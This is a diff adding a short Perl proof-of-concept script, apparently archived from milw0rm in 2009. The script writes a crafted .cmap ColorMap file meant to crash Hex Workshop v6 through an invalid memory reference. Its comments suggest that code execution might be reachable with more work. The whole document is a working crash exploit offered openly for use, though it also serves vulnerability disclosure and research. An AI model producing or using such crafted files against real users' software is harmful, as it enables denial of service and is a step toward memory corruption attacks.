@@ -1,0 +1,20 @@
+#!/usr/bin/perl -w
+# Hex Workshop v6 "ColorMap files .cmap" Invalid Memory Reference Crash POC
+# Discovred by : DATA_SNIPER
+# for more information vist my blog:http://datasniper.arab4services.net/
+# the Exploit it's  very hard to implemented,if we can make the "reference" point to  valid memory location contain
+# unicode string we can corrupt the memory and get code execution(it's not so easy as you can see,try it manually in olly).
+print "==========================================================================\n";
+print "Hex Workshop v6 (ColorMap files .cmap) Invalid Memory Reference crash POC\n";
+print "Discovred by DATA_SNIPER\n";
+print "Greetz to: arab4services team and AT4RE Team\n";
+print "===================================================================== \n";
+my $crash = '#Simple POC by DATA_SNIPER'."\n".'"%s"= RGB(0, 0, 0)'; #don't worry about it ,it's not Format string bug :)
+my $file = "cr4sh.cmap" ;
+open(my $data, ">>$file") or die "Cannot open $file";
+print $data $crash;
+close($data);
+print "$file has been created\n";
+print "open it in HexWorkshop.\n";
+
+# milw0rm.com [2009-02-03]
